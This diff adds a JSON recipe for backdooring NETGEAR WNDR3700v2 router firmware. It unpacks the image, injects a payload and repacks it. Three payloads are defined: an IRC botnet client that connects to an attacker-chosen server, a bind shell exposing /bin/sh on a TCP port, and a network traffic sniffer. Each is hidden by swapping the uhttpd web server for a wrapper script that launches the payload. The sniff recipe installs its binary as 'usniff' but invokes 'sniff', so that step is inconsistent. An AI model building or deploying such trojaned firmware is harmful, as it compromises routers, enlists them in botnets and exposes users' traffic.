@@ -1,0 +1,130 @@
+{
+  "Meta":{
+    "Targets":[
+      {
+        "Vendor":"NETGEAR",
+        "Model":"WNDR3700v2",
+        "Version":"1.0.0.12",
+        "Status":"Unverified"
+      }
+    ],
+    "Authors":[
+      "Michael Coppola"
+    ],
+    "Date":"July 25, 2012",
+    "Size":7078081,
+    "NeedsRoot":false,
+    "Filename":"WNDR3700v2-V1.0.0.12.img",
+    "Download":"",
+    "Checksum":"54c500efb7b32b6cd78da8ebdc773537"
+  },
+  "OrderOfOperations":[
+    "ExtractParts",
+    "UnpackFS",
+    "_PAYLOAD_",
+    "BuildFS",
+    "PadFS",
+    "AppFooter",
+    "GenerateIMG",
+    "PackImage"
+  ],
+  "ExtractParts":{
+    "Description":"Extracting parts from firmware image",
+    "Steps":[
+      ["extract", "_FIRMWARE_IMG_", 0, 128, "/header.bin"],
+      ["extract", "_FIRMWARE_IMG_", 192, 6838229, "/filesystem.bin"],
+      ["extract", "_FIRMWARE_IMG_", 6881472, 196608, "/footer.bin"],
+      ["extract", "_FIRMWARE_IMG_", 7078080, 1, "/lastbyte.bin"]
+    ]
+  },
+  "UnpackFS":{
+    "Description":"Unpacking filesystem",
+    "Steps":[
+      ["unsquashfs-3.0-lzma", "/filesystem.bin", "/extracted_fs"]
+    ]
+  },
+  "BuildFS":{
+    "Description":"Building filesystem",
+    "Steps":[
+      ["mksquashfs-3.0-lzma", "/extracted_fs", 65536, "be", "/newfs.bin"]
+    ]
+  },
+  "PadFS":{
+    "Description":"Padding filesystem with null bytes",
+    "Steps":[
+      ["pad", "/newfs.bin", 0, 6881280]
+    ]
+  },
+  "AppFooter":{
+    "Description":"Appending footer to filesystem",
+    "Steps":[
+      ["appendfile", "/footer.bin", "/newfs.bin"]
+    ]
+  },
+  "GenerateIMG":{
+    "Description":"Generating OpenWRT header",
+    "Steps":[
+      ["mkimage", "/newfs.bin", "mips", "linux", "filesystem", "none", "bf070000", "bf070000", "WNDR3700v2-V1.0.0.12"]
+    ]
+  },
+  "PackImage":{
+    "Description":"Gluing pieces together",
+    "Steps":[
+      ["touch", "_TARGET_IMG_"],
+      ["appendfile", "/header.bin", "_TARGET_IMG_"],
+      ["appendfile", "/newfs.bin", "_TARGET_IMG_"],
+      ["appendfile", "/lastbyte.bin", "_TARGET_IMG_"]
+    ]
+  },
+  "Payloads":{
+    "botnet":{
+      "Description":"Remotely control device via IRC",
+      "Steps":[
+        ["cp", "payloads/botnet", "/extracted_fs/usr/sbin/botnet"],
+        ["mv", "/extracted_fs/usr/sbin/uhttpd", "/extracted_fs/usr/sbin/uhttpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/botnet _IP_ _PORT_ \\_CHANNEL_ _PREFIX_ &\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/uhttpd.bak\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/uhttpd"]
+      ],
+      "Variables":{
+        "_IP_":"IP address of IRC server",
+        "_PORT_":"Port of IRC server",
+        "_CHANNEL_":"Channel to join (include #)",
+        "_PREFIX_":"Prefix of bot nick"
+      }
+    },
+    "bind":{
+      "Description":"Bind shell on TCP port",
+      "Steps":[
+        ["cp", "payloads/bind", "/extracted_fs/usr/sbin/bind"],
+        ["mv", "/extracted_fs/usr/sbin/uhttpd", "/extracted_fs/usr/sbin/uhttpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/bind _PORT_ /bin/sh &\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/uhttpd.bak\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/uhttpd"]
+      ],
+      "Variables":{
+        "_PORT_":"Port to listen on"
+      }
+    },
+    "sniff":{
+      "Description":"Sniff traffic on the network",
+      "Steps":[
+        ["cp", "payloads/sniff", "/extracted_fs/usr/sbin/usniff"],
+        ["mv", "/extracted_fs/usr/sbin/uhttpd", "/extracted_fs/usr/sbin/uhttpd.bak"],
+        ["touch", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "#!/bin/sh\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/sniff _TARGET_ _LISTEN_ &\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["appendtext", "/usr/sbin/uhttpd.bak\n", "/extracted_fs/usr/sbin/uhttpd"],
+        ["chmod", "0777", "/extracted_fs/usr/sbin/uhttpd"]
+      ],
+      "Variables":{
+        "_TARGET_":"Sniff TCP traffic on port",
+        "_LISTEN_":"Port to listen on"
+      }
+    }
+  }
+}
